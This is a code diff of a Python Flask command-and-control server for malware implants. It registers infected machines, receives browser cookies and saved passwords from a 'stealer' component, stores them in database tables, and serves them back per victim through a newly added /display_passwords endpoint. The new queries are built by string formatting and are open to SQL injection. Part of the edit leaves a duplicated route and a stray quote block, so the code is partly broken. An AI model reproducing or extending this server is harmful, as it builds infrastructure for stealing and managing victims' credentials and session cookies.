@@ -167,8 +167,6 @@ def client_get_commands():
 
 
 # Register an implant, on the implant side TODO
-
-
 @app.route("/register_implant", methods=["POST"])
 def register_implant():
     try:
@@ -178,7 +176,7 @@ def register_implant():
         print(data['sleep'])
         jitter = 10
         sleep = 1
-        first_connection = last_seen = datetime.now()
+        first_connection = last_seen = datetime.now(tz=None)
         active = True
         columns = ["first_connection", "active",
                    "jitter", "sleep", "last_seen"]
@@ -199,15 +197,12 @@ def register_implant():
 def display_implants():
     try:
         dbResp = tools.executeSelectQuery("SELECT * FROM IMPLANTS")
-        print(dbResp)
         return dbResp, 200, {'Access-Control-Allow-Origin': config.clientURL}
     except Exception as e:
         print(f"Error displaying implants: {e}")
         return e, {'Access-Control-Allow-Origin': config.clientURL}
 
 # Endpoint for stealer to connect to
-
-
 @app.route("/response_stealer", methods=["POST"])
 @cross_origin()
 def handle_response_stealer():
@@ -220,6 +215,8 @@ def handle_response_stealer():
         cookie_values, password_values = WyattWonderland.newParseJSON(data)
         print("After calling wyatts wonderland")
         task_id = data['task_id']
+        target_implant_id = data['target_implant_id'] 
+        tools.updateLastSeen(target_implant_id)
         success = data['success']
         if success in ['Success', 'success']:
             success = True
@@ -235,17 +232,41 @@ def handle_response_stealer():
 
         query_passwords = "INSERT INTO passwords(task_id, target_implant_id, path, username, password, url) VALUES(%s, %s, %s, %s, %s, %s)" 
 
-        response1 = tools.executeMany(query_cookies, cookie_values)
-        response2 = tools.executeMany(query_passwords, password_values)
+        tools.executeMany(query_cookies, cookie_values)
+        tools.executeMany(query_passwords, password_values)
 
         return "Success", 200, {'Access-Control-Allow-Origin': config.clientURL}
     except Exception as error:
         print(error)
         return error, 402, {'Access-Control-Allow-Origin': config.clientURL}
 
+@app.route("/display_passwords", methods=["POST"])
+def handle_passwords():
+    try: 
+        data = request.json 
+        id = data.get('id')
+
+        if (id == None):
+            return {"cookies":[], "passwords":[]}, 200, {'Access-Control-Allow-Origin': config.clientURL}
+
+        cookie_query = f"SELECT * FROM cookies WHERE (target_implant_id={id})"
+        password_query = f"SELECT * FROM passwords WHERE (target_implant_id={id})" 
+        
+        cookie_array = tools.executeSelectQuery(cookie_query)
+        password_array = tools.executeSelectQuery(password_query) 
+
+        cookie_object = [{"task_id": x[1], "path":x[3], "hostkey":x[4], "value":x[5]} for x in cookie_array]
+        password_object = [{"task_id": x[1], "path":x[3], "url":x[6], "username":x[4], "password":x[5]} for x in password_array]
+
+
+
+        return {"cookies":cookie_object, "passwords":password_object} , 200, {'Access-Control-Allow-Origin': config.clientURL}
+
+    except Exception as e:
+        print(e)
+        return e, 400, {'Access-Control-Allow-Origin': config.clientURL}
+
 # Route for implant to post a new symmetric key
-
-
 @app.route("/new_symkey", methods=["POST"])
 def getsymkey():
     try:
@@ -290,11 +311,14 @@ def getsymkey():
 
 # Addisons Worktime -
 # Attempting to add encryption
-@app.route("/response_data", methods=["POST"])
+
+    
+## For getting new symkey
+@app.route("/new_symkey", methods=["POST"])
 @cross_origin()
-def handle_response_data():
+def new_symkey():
     print("Received response")
-    if (request.content_length < 5000000):
+    if (request.content_length < 256):
         try:
             data = request.get_data()
             # print(data)
@@ -306,6 +330,7 @@ def handle_response_data():
             print(data)
             print(str(data))
             print(jsonify(data))
+            """
             target_implant_id = data['target_implant_id']
             task_id = data['task_id']
             response_data = data['response_data']
@@ -335,7 +360,7 @@ def handle_response_data():
             return "failure", 409, {'Access-Control-Allow-Origin': config.clientURL}
     else:
         return "failure", 409, {'Access-Control-Allow-Origin': config.clientURL}
-
+        """
 
 # Implant response endpoint, in json
 @app.route("/response_json", methods=["POST"])
@@ -347,6 +372,7 @@ def handle_response_json():
         print()
         print("response:")
         target_implant_id = data['target_implant_id']
+        tools.updateLastSeen(target_implant_id)
         task_id = data['task_id']
         response_data = data['response_data']
         success = data['success']
@@ -377,23 +403,7 @@ def handle_response_json():
         print()
         return "failure", 409, {'Access-Control-Allow-Origin': config.clientURL}
 
-
-@app.route("/response_test", methods=["POST"])
-def testThis():
-    try:
-        file = "file not accesed"
-        file = request.files['file']
-        message = SteganographyFixed.decode(
-            SteganographyFixed.iio.imread(file))
-        print(message)
-        return 'yer', 200, {'Access-Control-Allow-Origin': '*'}
-    except Exception as error:
-        print(error)
-        return error, 401, {'Access-Control-Allow-Origin': '*'}
-
 # Gets log history of a particular implant, for console
-
-
 @app.route("/get_history", methods=["POST"])
 def get_history():
     try:
@@ -418,7 +428,6 @@ def get_history():
 
         combined += [{"sender": "user", "creator": x[8],
                       "time":x[3], "command":x[2]} for x in pending]
-        print(executed)
         sortedList = sorted(combined, key=lambda x: x['time'])
 
         return {"sorted": sortedList}, 200, {'Access-Control-Allow-Origin': '*'}
@@ -430,7 +439,7 @@ def get_history():
 @app.route("/upload_files", methods=["POST"])
 def upload_files():
     try:
-        file = request.files
+        file = request.files 
         print("recieved upload_files: \n Response: ")
         print(file)
     except Exception as e:
